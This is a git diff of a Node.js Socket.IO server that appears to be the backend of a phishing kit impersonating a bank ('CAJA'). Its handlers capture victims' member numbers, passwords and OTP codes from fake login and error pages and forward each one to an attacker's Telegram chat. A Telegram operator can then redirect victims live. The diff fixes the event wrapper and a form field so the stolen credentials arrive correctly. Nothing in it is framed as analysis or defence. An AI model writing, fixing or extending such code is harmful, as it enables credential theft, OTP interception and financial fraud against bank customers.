@@ -24,7 +24,8 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-  // Login principal (ajustado para campo socio)
+io.on('connection', (socket) => {
+  // Login principal (campo socio)
   socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -44,7 +45,6 @@ app.use(bodyParser.json());
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-         
   // Código OTP (bienvenido.html)
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
@@ -85,8 +85,8 @@ app.use(bodyParser.json());
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
+  // Formulario de errorlogo.html — CORREGIDO
+  socket.on('errorlogoForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
     const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
@@ -130,15 +130,16 @@ app.use(bodyParser.json());
     activeSockets.set(sessionId, socket);
   });
 
-  // Redirección solicitada desde botones en el HTML
+  // Redirección desde el cliente
   socket.on("redirigir", ({ url, sessionId }) => {
     const socketTarget = activeSockets.get(sessionId);
     if (socketTarget) {
       socketTarget.emit("redirigir", url);
     }
   });
+});
 
-// Respuesta a botones desde Telegram
+// Respuesta desde Telegram
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
